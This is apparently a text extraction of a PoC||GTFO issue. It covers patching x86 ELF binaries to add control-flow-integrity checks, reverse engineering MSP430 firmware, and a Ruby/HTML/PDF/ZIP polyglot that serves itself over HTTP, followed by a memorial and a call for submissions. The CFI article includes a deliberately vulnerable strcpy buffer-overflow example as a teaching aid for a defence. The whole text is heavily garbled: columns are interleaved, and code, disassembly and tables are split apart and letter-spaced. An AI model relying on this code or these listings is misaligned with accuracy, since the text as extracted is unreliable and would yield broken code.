that forces the software to follow a predetermined
effectively kill with our ghetto trick.
control flow graph (CFG), drastically restricting the
available gadgets for return-oriented programming 1 #include < s t r i n g . h>
and other nifty exploit tricks.
3 void smashme ( char∗ b l a h ) {
Unfortunately, the current implementations in
char smash [ 1 6 ] ;
both Microsoft’s Visual C++ and LLVM’s clang 5
s t r c p y ( smash , b l a h ) ;
}
compilers require source to be compiled with special
flags to add CFG checking. This is sufficient when 7 i n t main ( i n t a r g c , char ∗∗ a r g v ) {
new software is created with the option of added se- 9
i f ( argc > 1) {
smashme ( a r g v [ 1 ] ) ;
curity flags, but we do not always have such luxury.
}
When dealing with third party binaries, or legacy 11
}
applications that do not compile with modern com-
pilers, it is not possible to insert these compile-time
protections.
Luckily, we can combine static analysis with bi-
In x86, the stack has a layout like the following.
nary patching to add an equivalent level of protec-
tion to our binaries. In this article, I explain the
theory of CFI, with specific examples for patching
Local Variables
x86 32-bit ELF binaries—without the source code.
Saved ebp
CFI is a way of enforcing that the intended con-
Return Pointer
trol flow graph is not broken, that code always takes
Parameters
intended paths. In its simplest applications, we
...
check that functions are always called by their in-
tended parents. It sounds simple in theory, but in
application it can get gnarly. For example, consider:
By providing enough characters to smashme, we
can
overwrite the return pointer. Assume for now,
i n t a ( ) { return 0 ; }
that we know where we are allowed to return to.
i n t b ( ) { return a ( ) ; }
i n t c ( ) { return a ( ) + b ( ) + 1 ; }
We can then provide a whitelist and know where it
is safe to return to in keeping the control flow graph
For the above code, our pseudo-CFI might look
of the program valid.
like the following, where called_by_x checks the
Figure 4 shows the disassembly of smashme()
return address.
and main(), having been compiled by GCC.
int a ( ) {
Great.
Using our whitelist, we know that
i f ( ! called_by_b && ! called_by_c ) {
smashme
should
only return to 0x08048456, because
exit () ;
}
it is the next instruction after the ret. In x86, ret
return 0 ;
is equivalent to something like the following. (This
}
is not safe for multi-threaded operations but we can
int b ( ) {
ignore that for now.)
i f ( ! called_by_c ) {
exit () ;
}
return a ( ) ;
1 pop ecx ; p u t s t h e r e t u r n a d d r e s s t o e c x
jmp ecx ; jumps t o t h e r e t u r n a d d r e s s
}
13 i n t c ( ) { return a ( ) + b ( ) + 1 ; }
24[ 0 x08048320 ]> pdf@sym.smashme
2 / ( f c n ) sym.smashme 26
|
; a r g i n t arg_2
@ ebp+0x8
4 |
; var i n t local_6
@ ebp −0x18
|
; CALL XREF from 0 x08048451 ( sym.smashme )
6 |
0 x0804841d
55
push ebp
|
0 x0804841e
89 e5
mov ebp , esp
8 |
0 x08048420
83 e c 2 8
sub esp , 0 x28
|
0 x08048423
8 b4508
mov eax , dword [ ebp+arg_2 ]
10 |
0 x08048426
89442404
mov dword [ esp + 4 ] , eax
|
0 x0804842a
8 d45e8
l e a eax , [ ebp−l o c a l _ 6 ]
12 |
0 x0804842d
890424
mov dword [ esp ] , eax
|
0 x08048430
e8bbfeffff
call sym.imp.strcpy
14 |
0 x08048435
c9
leave
\
0 x08048436
c3
ret
16 [ 0 x08048320 ]> pdf@sym.main
/ ( f c n ) sym.main 33
18 |
; a r g i n t arg_0_1
@ ebp+0x1
|
; a r g i n t arg_3
@ ebp+0xc
20 |
; DATA XREF from 0 x08048337 ( sym.main )
|
;−− main :
22 |
0 x08048437
55
push ebp
|
0 x08048438
89 e5
mov ebp , esp
24 |
0 x0804843a
83 e 4 f 0
and esp , 0 x f f f f f f f 0
|
0 x0804843d
83 e c 1 0
sub esp , 0 x10
26 |
0 x08048440
837 d0801
cmp dword [ ebp + 8 ] , 1
|
,=< 0 x08048444
7 e10
j l e 0 x8048456
28 |
|
0 x08048446
8 b450c
mov eax , dword [ ebp+arg_3 ]
|
|
0 x08048449
83 c004
add eax , 4
30 |
|
0 x0804844c
8 b00
mov eax , dword [ eax ]
|
|
0 x0804844e
890424
mov dword [ esp ] , eax
32 |
|
0 x08048451
e8c7ffffff
c a l l sym.smashme
|
|
; JMP XREF from 0 x08048444 ( sym.main )
34 |
‘−> 0 x08048456
c9
leave
\
0 x08048457
c3
ret
Figure 4 – Disassembly of main() and smashme().
25
; [ 0 x8 : 4 ] = 0
; [ 0 x1 : 4 ] = 0 x1464c45
; [ 0 xc : 4 ] = 0Well, wheels aren’t up yet. As mentioned before,
ret is c3, but absolute jumps are five bytes.
Cool. We can just add a check here. Perhaps
something like this?
pop ecx ; p u t s t h e r e t u r n a d d r e s s t o e c x
2 cmp ecx , 0 x08048456 ; c h e c k t h a t we r e t u r n t o
the r i g h t place
jne 0 x41414141 ; c r a s h
4 jmp ecx ; e f f e c t i v e l y r e t u r n
$ rasm2 −a x86 −b32 "jmp 0 x41414141 "
2 e93c414141
So what is left to do? Well, we can simply rewind
to the first complete opcode five bytes before the
ret, and add a jump, then relocate the remaining
opcodes. In this case, we could do something like
this:
Now just replace our ret instruction with the
check. ret in x86 is simply this:
$ rasm2 −a x86 −b32 " r e t "
2 c3
where our code is this:
$ rasm2 −a x86 −b32 " pop e c x ; cmp ecx , 0
x08048456 ; j n e 0 x41414141 ; jmp e c x "
2 5981 f 9 5 6 8 4 0 4 0 8 0 f 8 5 3 4 4 1 4 1 4 1 f f e 1
Sadly, this will not work for several reasons. The
most glaring problem is that ret is only one byte,
whereas our fancy checker is 15 bytes. For more
complicated programs, our checker could be even
larger! Thus, we cannot simply replace the ret
with our code, as it will overwrite some code after
it—in fact, it would overwritemain. We’ll need to
do some digging and replace our lengthy code with
some relocated parasite, symbiont, code cave, hook,
or detour—or whatever you like to call it!
Nowadays there aren’t many places to put our
code. Before x86 got its no-execute (NX) MMU bit,
it’d be easy to just write our code into a section like
.data, but marking this as +x is now a huge secu-
rity hole, as it will then be rwx, giving attackers a
great place for putting shellcode. The .text sec-
tion, where the main code usually goes, is marked
r-x, but there’s rarely slack space enough in this
section for our code.
Luckily, it’s possible to add or resize ELF sec-
tions, and there’re various tools to do it, such as
Elfsh, ERESI, etc. The challenge is rewriting the
appropriate pointers to other sections; a dedicated
tool for this will be released soon. Now we can add
a new section that is marked as r-x, replace our ret
with a jump to our new section—and we’re ready to
take off!
smashme :
2 push ebp
mov ebp , esp
4 sub esp , 0 x28
mov eax , dword [ ebp + 8 ]
6 mov dword [ esp + 4 ] , eax
l e a eax , [ ebp − 0 x18 ]
8 mov dword [ esp ] , eax
jmp p a r a s i t e
10
parasite :
12 c a l l s y m . i m p . s t r c p y
leave
14 pop ecx
cmp ecx , 0 x08048456
16 jne 0 x41414141
jmp ecx
Here, parasite is mapped someplace else in
memory, such as our new section.
With this technique, we’ll still to have to pass
on protecting a few kinds of function epilogues, such
as where a target of a jump is within the last five
bytes. Nevertheless, we’ve covered quite a lot of the
intended CFG.
This approach works great on platforms like
ARM and MIPS, where all instructions are constant-
length. If we’re willing to install a signal handler,
we can do better on x86 and amd64, but we’re ap-
proaching a dangerous situation dealing with sig-
nals in a generic patching method, so I’ll leave you
here for now. The code for applying the explained
patches is all open source and will soon be extended
to use emulation to compute relative calls.
Thanks for reading!
Jeff
26278
A Tourist’s Phrasebook for Reversing MSP430
by Ryan Speers and Travis Goodspeed
Howdy, y’all!
Welcome to another installment of our series of
quick-start guides for reverse engineering embedded
systems. Our goal here is to get you situated with
the MSP430 architecture as quickly as possible, with
a minimum of fuss and formality.
Those of you who have already used an MSP430
might find this to be a useful reference, while those
of you new to the architecture will find that it isn’t
really all that strange. If you’ve already reverse engi-
neered binaries for any platform, even x86, we hope
that you’ll soon feel right at home.
8.1
Additionally, there is an Info Flash area at
0x1000. While there is nothing to stop an engineer
from using this for code, the region is generally used
for configuration settings. In many devices, chips
arrive with this region pre-programmed to contain
calibration settings for the internal clock.
In most devices, the BSL ROM at 0x0C00 con-
tains a serial bootloader that allows the chip to be
reprogrammed even after the JTAG fuse has been
blown, and if you know the contents of the last 32
bytes of Flash—the Interrupt Vector Table—you can
also read out the contents of memory.
The Landscape
Architecture
Von Neumann
16-bit words
8.3
Back in the old days, reverse engineering MSP430
code meant using GNU objdump and annotating on
pen and paper. Some folks would wrap these tools in
Perl, or fill paper notebooks with cross-referencing,
but thankfully that’s no longer necessary.
Registers
R0: Program Counter
R1: Stack Pointer
R2: Status Register
R3: Constant Generator
R4-R15: General Use
Nowadays, IDA Pro has excellent support for the
platform. If you have a legit license, just open the
Intel Hex image of your target and specify MSP430
as the architecture. Memory locations can be had
from the appropriate datasheets.
Address Space
16-bit (MSP430)
20-bit (MSP430X, X2)
8.2
Radare2’s MSP430 support is a bit less mature,
and you should make sure to sanity check the dis-
assembly wherever it looks suspect. Luckily, the
Radare2 developers are frighteningly quick about
fixing bugs, so both bugs that bothered us in the
writing this article will likely be patched by the time
you read this. For best results, always run Radare2
built from the latest Git repository, 10 —and rebuild
it often.
Memory Map
Unlike other embedded platforms, which like to put
the interrupt vector table (IVT) at the beginning
of memory, the MSP430 places it at the very end
of the 16-bit address space, in Flash. (On smaller
chips, this is the very end of Flash.)
Early on, Low RAM at 0x0200 would be the
only RAM location, but as that region proved too
small, a High RAM area was created at 0x1100. For
firmware compatibility reasons, the Low RAM area
is mapped on top of the High RAM area.
Note that Flash grows down from the top of
memory, while the RAM grows up. On chips with
a 20-bit address space, an Extended Flash region
sometimes grows upward from 0x10000.
10 git
Loading into a Disassembler
One last tool, which is fast becoming obsolete
with Radare2’s support, is the MSPGCC project’s
single-line assembler. 11 It is particularly handy,
though, when sanity-checking your own implemen-
tation of an assembler or disassembler.
There are no known decompilers for the MSP430,
but with small code sizes and rather legible assembly
we don’t expect one to be necessary.
clone https://github.com/radare/radare2
11 http://mspgcc.sourceforge.net/assemble.html
28Start
0x0000
0x0010
0x0100
0x0200
0x0C00
0x1000
0x1100
End
0x000F
0x00FF
0x01FF
0x09FF
0x0FFF
0x10FF
Size
16
240
255
1024
256
0xFFFF
0x10000
Use
Interrupt Control Registers
8-bit Peripherals
16-bit Peripherals
Low RAM (Mirrored at 0x1100)
BootStrap Loader (BSL ROM)
Info Flash
High RAM
Flash
Extended Flash
Table 1 – MSP430 and MSP430X Address Space
8.4
Basics of the Instruction Set
x(Rn) Operate on what is in memory at the ad-
dress Rn + x.
The language is relatively simple, but there are a
few dialects that the locals speak. There are 27 ac-
tion words (instructions), and then some additional
emulated instructions which are assembled to one
of the 27. Most of these 27 instructions have two
forms—.B when they are working on an 8-bit byte,
or .W if they want to tackle a 16-bit word. If someone
tells you something and doesn’t specify it, you can
assume it’s a word. If you’re doing a byte operation
in a register, be warned that the most-significant
byte is cleared.
The three main types of core words are single-
operand arithmetic, two-operand arithmetic, and
jumps.
Our simple single-operands are RRC (1-bit ro-
tate right and carry), SWPB (swap the bytes of the
word), RRA (1-bit rotate right as arithmetic), SXT
(sign-extend a byte into a word), PUSH (onto the
stack), CALL (a subroutine, by pushing PC and
then moving the new address to PC), and RETI
(return from interrupt, restoring the Status Regis-
ter SR and PC from stack).
Although these are all simple folk, they can, of
course, be addressed in many different ways. If our
register is n, then we see a few major types of ad-
dressing, all based off of the ‘As’ (for source) and
‘Ad’ (limited options for destination) fields:
Wait, we just told you about an ‘x’. Where did
that come from?! In this case, it’s an extension word,
where the next 16-bit word after the extension de-
fines x. In other words, it’s an index off the base
address held in Rn.
If the register is r0 (PC, the program counter),
r2 (SR, the status register), or r3 (the constant gen-
erator), special cases apply. A common special case
is to give you a constant, either -1, 0, 1, 2, 4, or 8.
Now we tackle two-operand arithmetic opera-
tions, most of which you should recognize from any
other instruction set. The mov, add, addc (add with
carry), sub, and subc instructions are all as you’d
expect. cmp pretends to subtract the source from
the destination to set status flags. dadd does a dec-
imal addition with carry. xor and and are bitwise
operations as usual. We have three that are a little
unique: bis (logical OR), bic (dest = dest AND
src), and bit (test bits of src AND dest).
Even with these instructions, though, we’re still
missing many favorite mnemonics that you’ll see in
disassembly. These are emulated instructions, actu-
ally implemented using other instruction(s).
For example, br dst (branch) is an emulated
instruction. There is no branch opcode, but in-
stead the br instructions are assembled as mov dst,
pc. Similarly, pop dst is really mov @SP+, dst, and
ret is really mov @sp+, pc. If these mappings make
sense, you’re all set to continue your travels!
Thus, when we need to get around this land of
MSP430, we look not to the many jump types of
x86, but instead to simpler patterns, where the only
kind of jump operands are relative, and that’s that.
Rn Operate on the contents of register n.
@Rn Operate on what is in memory at the address
held in Rn.
@Rn+ Same as above, then increment the register
by 1 or 2. 12
12 Here are the rules: Increment by two if registers r0 or r1, or if r4-r15 are used with a .W (2-byte) operand. Increment by
1 if r4 to r15 are used with a .B operand.
29So jmp, the instruction says, but where to? The
first three bits (001) mean jump, the next three
specify the conditional, and the remaining ten are
a signed offset. To get there, the ten bits are multi-
plied by two (left shifted) and then are added to the
program counter, r0. Why multiply by two? Well,
we have 16-bit word alignment, in the MSP430 land,
unlike with those pesky x86 instructions you might
be thinking of. Ordnung muß sein!
You might have noticed in your disassembly that
even though we told you this was a fixed-width in-
struction set, some instructions are longer than one
16-bit word! One way this can happen is when us-
ing immediate values, which—much like those of the
glorious PDP-11 of old—are implemented by derefer-
encing and incrementing the program counter. This
way, the CPU will skip over the immediate value in
its code fetch path just as it’s fetching that same
value as data.
And, finally, there are prefix instructions that
have been added in MSP430X, the 20-bit extension
of the MSP430. These prefix instructions go before
the normal instruction, and you’ll most commonly
see them setting the upper four bits of the pointer
in a 20-bit function call.
8.5
this heuristic, we assume that indirect calls are rare,
and look for br #addr and call #addr instructions.
Both of these consist of two 16-bit words, and what-
ever the #addr we extract from that second word,
there’s a good chance that it’s the start of a func-
tion.
Using this logic, you should be able to find func-
tions even in stripped images disassembled with
msp430-objdump. A short script, or a good disas-
sembler, should help automate the marking of these
functions.
8.6
As with your (other) favorite microcontroller, our
exploration of the code can be preempted by an in-
terrupt.
If you don’t like these getting in the way of
your travels, they can be globally or individually
disabled—well, except for the non-maskable inter-
rupts (NMI). 13
The MSP430 handles any interrupts set in prior-
ity order, and goes through the interrupt vector ta-
ble to find the right interrupt service routine’s (ISR)
starting address. It hides away the current PC and
SR on the stack, and runs the ISR. The ISR then
returns, and normal execution continues.
If one thing is for certain, it’s that 0xFFFE is the
system’s reset ISR address (used on power-up, exter-
nal reset, etc.), and that it has the highest priority.
If you have an elf32-msp430 formatted dump, 14
use msp430-objdump dump.msp430 -DS to get dis-
assembly. Then locate the interrupt table at the end
of memory:
What’s a Function, Anyways?
In x86 assembly, we’re used to looking for function
preambles to pick out the functions—but what do
we look for in MSP430 code? We’ve already dis-
cussed finding the entry point of the program and
those of other ISRs by looking at the vectors in the
IVT. What about other functions?
In MSP430, all functions that are not ISRs will
end with a RET instruction—which, as you recall, is
actually a MOV @SP+, PC.
Compilers vary greatly in the calling
conventions—as there is actually no fixed ABI. Usu-
ally, arguments get passed in r12, r13, r14, and
r15. This, however, is by no means a requirement.
MSP430 GCC uses r15 for the first parameter and
for most return value types, and r14, r13, and
r12 for the other parameters. Texas Instruments’
Code Composer and the IAR compiler (after EW430
4.10A release) use r12, r13, r14, and r15 and return
in r12.
We recommend using an additional heuristic in-
stead of looking for a function preamble format. In
0000 f f c 0 <. s e c 2 >:
ffc0 :
26 32 j n $−946 ; abs 0 x f c 0 e
...
fffc :
26 32 j n $−946 ; abs 0 x f c 4 a
fffe :
00 31 j n $+514 ; abs 0 x200
We look at 0xFFFE for the reset interrupt ad-
dress, which is 0x3100 in this image. That’s our
entry point into the program, and you can see how
it nicely lines up in the disassembly:
00003100 <. s e c 1 >:
3 1 0 0 : 31 40 00 31
3 1 0 4 : 15 42 20 01
3 1 0 8 : 75 f 3
13 Global
14 If
Making Sense of Interrupts
mov
#12544 , r 1
mov
&0x0120 , r 5
and . b #−1,
r5
disable is done by clearing the ‘GIE’ bit of the status register, r2.
not, use a command like msp430-objcopy -I ihex -O elf32-msp430 dump.hex dump.msp430 to convert into one.
30We note that 0x4452 is used often. A quick look
at this address shows that it is an empty IVT not-
ing unused interrupts. Since we’re interested in the
USART1 receive path, we follow 0x55d0 and see a
large function that in turn calls another function—
both nicely annotated, as we were working from an
image with debug symbols:
000055 d0 <sig_UART1RX_VECTOR>:
...
563 a : b0 12 98 46
c a l l #0x4698
...
00004698 <SerialP__rx_state_machine >:
...
This technique of looking up your IVT entries
and then working backwards to reverse engineer any
handlers that correspond to the functionality you
are interested in can help you avoid getting lost in
reversing unimportant pieces of the code.
8.7
If we’re reversing some firmware, hopefully we have
a target—often this can be data lines going to a radio
or some peripheral that carry sensitive data.
Some peripherals are dealt with via interrupts,
as shown above, but some are also either partially
or totally handled via touching memory defined by
the peripheral file map.
In particular, as an alternative to using inter-
rupts, a program could simply poll for incoming data
or a change in a pin’s state. Likewise, setting up
configurations for items such as the USART discussed
above is done in the peripheral file map.
Maybe we want to look at some specific function-
ality that is triggered by an interrupt, for example
incoming serial data. Looking in the MSP430F1611
data sheet, we find that USART1 receive is a mask-
able interrupt at 0xFFE6. If we look at the notated
IVT in an example program (e.g., TinyOS’s Printf
program compiled for TelosB), we see addresses (in
little endian) as shown here:
0000 f f e 0
ffe0
ffe2
ffe4
ffe6
ffe8
ffea
ffec
ffee
fff0
fff2
fff4
fff6
fff8
fffa
fffc
fffe
15 Page
:
:
:
:
:
:
:
:
:
:
:
:
:
:
:
:
<__ivtbl_16 >:
52 44
52 44
56 56
d0 55
52 44
94 4 f
76 4 f
52 44
52 44
52 44
52 44
52 44
d8 4 f
ba 4 f
52 44
00 40
Sorting out Peripherals
dac /dma
i / o p2
u s a r t 1 tx
u s a r t 1 rx
i / o p1
t i m e r a3
t i m e r a3
adc12
u s a r t 0 tx
u s a r t 0 rx
watchdog t i m e r
compartor a
t i m e r b7
t i m e r b7
nmi/ e t c
reset
23 of http://www.ti.com/lit/ds/symlink/msp430f1611.pdf
31often you’d rather want to understand the actual
data being written out. For this, we look for the
peripheral holding the transmit buffer pointer—in
our case at 0x007F, according to the chip documen-
tation. Searching for this in the disassembly leads
us to a few interesting functions. Firstly, there’s one
that disables the UART, which fills this address with
null bytes. This helps us confirm we’re looking at
the right address. We also see this address written
to in the interrupt handler that we located in the
previous section—and in a large function that ends
up being a form of printf for writing out to this
serial line.
Let us take the same file we used above, and
look in the MSP430F1611 guide for the USART1 in
the peripheral file map. 15 Here we see the registers
in the range from 0x0078 to 0x007F. Let us search
for a few of these in the image to demonstrate the
applicability of this technique.
First, we look for 0x0078 (USART control),
0x0079 (transmit control), and 0x007A (receive con-
trol). We find them all together in a function that
is responsible for configuring the USART resource.
A reader referencing the documentation will see the
other control registers also updated:
4 e 8 e <Msp430Uart . . .
...
4 eb4 :
c2 4 e 78 00
4 eb8 : d2 42 04 11
4 ebc :
79 00
4 ebe : d2 42 05 11
4 e c 2 : 7 a 00
4 e c 4 : 1 e 42 00 11
4 ec8 :
c2 4 e 7 c 00
4 e c c : 8 e 10
4 ece : 4e 4e
4 ed0 :
c2 4 e 7d 00
4 ed4 : d2 42 02 11
...
Configure . . . > :
As you can see, working backwards from the ad-
dresses located in the peripheral file map can help
you quickly find functions of interest.
–——–
———
—–—–
mov . b r14 ,
&0x0078
mov . b &0x1104 ,&0 x0079
mov . b &0x1105 ,&0 x007a
mov
mov . b
swpb
mov . b
mov . b
mov . b
This guide is neither complete nor perfectly ac-
curate. We told a few lies-to-children as all teach-
ers do, and we omitted a dozen nifty examples that
would’ve fit. Still, we hope that this will whet your
appetite for working with the MSP430 architecture,
and that, when you begin to work on the ’430s, you
can get your bearings quickly, jumping into the fun
part of the journey with less hassle.
&0x1100 , r 1 4
r14 ,
&0x007c
r14
r14 ,
r14
r14 ,
&0x007d
&0x1102 ,&0 x007b
Whereas this approach can help you understand
the settings to better sniff the serial bus physically,
Also, for more MSP430 exploitation tricks, check
out PoCkGTFO 2:5!
329
This HTML page is also a PDF
which is also a ZIP
which is also a Ruby script
which is an HTTP quine; or,
The Treachery of Files
by Evan Sultanik
from a concept independently conceived by Ange Albertini
and with great technical assistance from Philippe Teuwen
Please rise and open your hymnal for the recitation of PoCkGTFO 7:6.
“ A file has no intrinsic meaning. The meaning of a file—its type, its validity, its contents—can be
different for each parser or interpreter.
”
You may be seated.
In the spirit of самиздат and the license of this publication, we thought it might be nifty to aid its
promulgation by enabling the PDF to mirror itself. That’s right, this PDF is an HTTP quine: it is a web
server that serves copies of itself.
$ ruby pocorgtfo11.pdf &
Listening for connections on port 8080.
To listen on a different port,
re-run with the desired port as a command-line argument.
$ curl -s http://localhost:8080/pocorgtfo11.pdf | diff -s - pocorgtfo11.pdf
A neighbor at 127.0.0.1 is requesting /pocorgtfo11.pdf
Files - and pocorgtfo11.pdf are identical
Utilisation de la canne. — 1. Canne-filet à papillons. — 2. Canne à toiser les chevaux. —
3. Canne-parapluie. — 4. Canne musicale. — 5. Ceci n’est pas une pipe.
33This polyglot once again exploits the fact that 25 </body>
</html>
PDF readers ignore everything before the first in-
stance of “%PDF”. Coupled with Ruby’s __END__
token—which effectively halts interpretation—and
Any HTTP request with a URL that ends with .pdf
its __FILE__ token—which resolves to the path of
will result in a copy of the PDF; anything else will
the file being interpreted—it’s actually quite easy to
result in the HTML index parsed from DATA.
make an HTTP quine by prepending the PDF with
Since the data between __END__ and %PDF. . . is
the following:
pure HTML already, it would be a shame not to
require ’ socket ’
make this file a pure HTML polyglot, too (similar
2 s e r v e r = TCPServer . new ( ’ ’ , 8 0 8 0 )
to PoCkGTFO 0x07). Doing so is relatively simple
l o o p do
by wrapping PDF in HTML comments:
4
socket = server . accept
6
8
10
12
request = socket . gets
r e s p o n s e = F i l e . open (__FILE__) . r e a d
s o c k e t . p r i n t "HTTP/ 1 . 1 200 OK\ r \n" +
" Content−Type : a p p l i c a t i o n /
p d f \ r \n" +
" Content−Length : #{r e s p o n s e .
b y t e s i z e }\ r \n" +
" C o n n e c t i o n : c l o s e \ r \n"
s o c k e t . p r i n t " \ r \n"
socket . print response
socket . close
INSERT RUBY WEB SERVER HERE
2 __END__
<html>
4
...
</html>
6 < !−−
INSERT RAW PDF HERE
8 −− >
This is valid Ruby, since Ruby does not interpret
anything after the __END__. The PDF does not af-
fect the validity of the HTML since it is commented.
There will be trouble if the byte sequence “-->” (2D
2D 3E) occurs anywhere within the PDF, but this is
very unlikely and has proven not to be a problem.
Wrapping the Ruby webserver code in an HTML
comment would have been ideal, and does in fact
work for most PDF viewers. However, the pres-
ence of an HTML opening comment before the %PDF
causes Adobe’s parser to classify the file as HTML
and therefore refuse to open it.
Unfortunately, some web browsers interpret the
Ruby code as having an implied “<html>” preceding
it, adding all of that text to the DOM. This is reme-
died with Javascript in the HTML that sanitizes the
DOM if necessary.
As has become the norm, this PDF is also a
valid ZIP. This feat does not affect the Ruby/HTML
portion since the ZIP is embedded later in the file
as an object within the PDF (cf. PoCkGTFO 1:5).
This presents an additional opportunity for the web-
server: if the script can unzip itself, then it can also
serve all of the contents of the ZIP. Unfortunately,
Ruby does not have a ZIP decompression facility
in its standard library. Therefore, the webserver
calls the unzip utility with the “-l” option, pars-
ing the output to determine the names and sizes
of the constituent files. Then, a call to unzip with
“-p” writes raw decompressed contents to STDOUT,
which the web server splits apart and stores in mem-
ory. Any HTTP request with a URL that matches a
14 end
__END__
But why stop there? Ruby makes all of the bytes
in the script that occur after the __END__ token
available in the special “DATA” object. Therefore,
we can add additional content between __END__ and
%PDF that the script can serve.
1 require ’ socket ’
s e r v e r = TCPServer . new ( ’ ’ , 8 0 8 0 )
3 html = DATA. r e a d ( ) . s p l i t (/ <\/ html >/) [ 0 ] + "</
html>\n"
l o o p do
5
socket = server . accept
i f socket . gets . s p l i t ( ’ ’ ) [ 1 ] .
downcase . end_with ? " . p d f " then
7
c = " a p p l i c a t i o n / pdf "
d = F i l e . open (__FILE__) . r e a d
9
n = F i l e . s i z e (__FILE__)
else
11
c = " t e x t / html "
d = html
13
n = html . l e n g t h
end
15
s o c k e t . p r i n t "HTTP/ 1 . 1 200 OK\ r \
nContent−Type : #{c }\ r \ nContent−Length :
#{n}\ r \ nConnection : c l o s e \ r \n\ r \n"+d
socket . close
17 end
__END__
19 <html>
<head>
21
< t i t l e >An HTTP Quine PoC</ t i t l e >
</head>
23
<body>
<a h r e f=" p o c o r g t f o 1 1 . p d f ">Download
p o c o r g t f o 1 1 . p d f ! </a>
34file path within the ZIP is served that decompressed
file. This allows us to have images like a favicon
in the HTML. In the event that the PDF is inter-
preted as raw HTML—i.e., it was not served from
the Ruby script—a Javascript function conveniently
hides all of the ZIP access portions.
With all of this feature bloat, the Ruby/HTML
code that is prepended before the PDF started get-
ting quite large. Unfortunately, some PDF read-
ers like PDFium 16 (the default PDF viewer shipped
with Chrom(e|ium)) fail unless they find “%PDF”
within the first 1024 characters. Therefore, the fi-
nal trick in this polyglot is to exploit Ruby’s mul-
tiline comment syntax (which, like the __END__ to-
ken, owes itself to Ruby’s Perl heritage). This allows
us to start the PDF header early, within a com-
ment that will not be interpreted. Within that PDF
header we open a dummy object stream that will
contain the remainder of the Ruby script and the
following HTML code before the start of the “real”
PDF.
require ’ socket ’
2 =begin
%PDF−1.5
4 9999 0 o b j
<<
6 / Length INSERT_#
_REMAINING_RUBY_AND_HTML_BYTES_HERE
>>
8 stream
=end
10 INSERT REMAINING RUBY CODE HERE
__END__
12 INSERT HTML HERE
<!−−
14 endstream
endobj
16 INSERT RAW PDF HERE WITH LEADING %. . . HEADER
REMOVED
−−>
Figure 5 describes the anatomy of the polyglot,
as interpreted in each file format.
16 https://pdfium.googlesource.com/pdfium/
35Ruby
HTML
require statements Text occurring be-
=begin fore <html>. Some
Multiline
Comment
PDF
browsers will add PDF Header
this to the DOM, lowing <html> and 9999 0 obj
<<
/Length ?
>>
<head>. stream
ignoring the fol-
ZIP
=end
Ruby Webserver
Parses the HTML
from DATA and calls
Replace ? with
the number of
bytes here
(i.e., between
stream and
endstream)
unzip on itself to
extract the ZIP con-
tent
__END__
Everything after
__END__ is
accessible from
Ruby’s special
DATA object
HTML
Javascript to
remove
everything
between
“require. . . ” and
“__END__”
from the DOM, if
necessary
<!--
endstream
endobj
PDF Content
obj/stream
ZIP Content
as usual
(cf. PoCkGTFO 1:5
and 9:12)
Central Directory
Archive Comment
endstream/endobj
PDF Footer
-->
Figure 5 – Anatomy of the Ruby/HTML/PDF/ZIP polyglot. Green portions contain the main content of
their respective filetypes. White portions are for context and to illustrate modifications necessary to make
the polyglot work. Gray portions are not interpreted by their respective filetypes.
363710
In Memoriam: Ben “bushing” Byer
by fail0verflow
Ben Byer
1980–2016
We are deeply saddened by the news that our member, colleague, and friend Ben
“bushing” Byer passed away of natural causes on Monday, February 8th.
Many of you knew him as one of the public faces of our group, fail0verflow, and
before that, Team Twiizers and the iPhone Dev Team.
Outspoken but never confrontational, he was proof that even in the competitive
and often aggressive hacking scene, there is a place for both a sharp mind and a kind
heart.
To us he was, of course, much more. He brought us together, as a group and in
spirit. Without him, we as a team would not exist. He was a mentor to many, and
an inspiration to us all.
Yet above anything, he was our friend. He will be dearly missed.
Our thoughts go out to his wife and family.
Keep hacking. It’s what bushing would have wanted.
383911
Tithe us your Alms of 0day!
by Pastor Manul Laphroaig,
Unlicensed Proselytizer
International Church of the Weird Machines
Do this: write an email telling our editors how
to do reproduce ONE clever, technical trick from
your research. If you are uncertain of your English,
we’ll happily translate from French, Russian, South-
ern Appalachian, and German. If you don’t speak
those languages, we’ll draft a translator from those
poor sods who owe us favors.
Like an email, keep it short. Like an email, you
should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—
WORSE!—that we’ll be bored if you include a long
tutorial where a quick reminder would do.
Just use 7-bit ASCII if your language doesn’t
require funny letters, as whenever we receive some-
thing typeset in OpenOffice, we briefly mistake it
for a ransom note. Don’t try to make it thorough
or broad. Don’t use bullet-points, as this isn’t a
damned Powerpoint deck. Keep your code samples
short and sweet; we can leave the long-form code as
an attachment. Do not send us L A TEX; it’s our job
to do the typesetting!
Do pick one quick, clever trick and explain it in
a few pages. Teach me how to write a memory-
corruption exploit—not just shellcode!–that triggers
the same bug without profiling on MIPS, PowerPC,
x86, and AMD64. Show me how to write a 64-
bit DOS extender, or how to extract firmware from
locked regions on an MSP432’s funky flash protec-
tion.
Don’t tell me that it’s possible; rather, teach me
how to do it myself with the absolute minimum of
formality and bullshit.
Like an email, we expect informal (or faux-
biblical) language and hand-sketched diagrams.
Write it in a single sitting, and leave any editing
for your poor preacherman to do over a bottle of
fine scotch. Send this to pastor@phrack org and
hope that the neighborly Phrack folks—praise be to
them!—aren’t man-in-the-middling our submission
process.
Howdy, neighbor!
A man came to me, and he said, “Forgive me,
Preacher, for I have sinned. I play piano in a
brothel.”
I laughed, “That ain’t no sin, neighbor. Folks
need their music. Go now in peace.”
But the man was worried, he said, “No, Preacher,
I’ve really sinned. I need your forgiveness.”
So I laughed again, “Go now, you are forgiven!
Stop wasting my time.”
“But Preacher, I teach children to use PHP!”
“Why would you lie to me about your profession
like that?”
“Oh, you try confessing an occupation like that!”
“I’m glad I don’t have to,” I said while finishing
my drink, “’cause until today I didn’t believe there
was any fate I feared more than hell.”
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, D.D.
40PoC||GTFO
P
r
o
o
f
o
f
C
o
n
c
e
p
t
o
r
G
e
t
T
h
e
F
u
c
k
O
u
t
COLLECTING BOTTLES OF BROKEN THINGS,
PASTOR MANUL LAPHROAIG
WITH THEORY AND PRAXIS
COULD BE THE MAN
WHO SNEAKS A LOOK
BEHIND THE CURTAIN!
12:2 Surviving the Computation Bomb 12:8 UMPOwn; A Symphony of Win10 Privilege
12:3 A Z-Wave Carol 12:7 Ирония Судьбы; or, Shellcode Hash Collisions
12:4 Comma Chameleon 12:9 VIM Execution Engine
12:5 Putting the VM in M/o/Vfuscator 12:10 Doing Right by Neighbor O’Hara
12:6 A JCL Adventure with Network Job Entries 12:11 Are Androids Polyglots?
Funded by our famous Single Malt Waterfall and
Pastor Laphroaig’s Рентгениздат Gospel Choir,
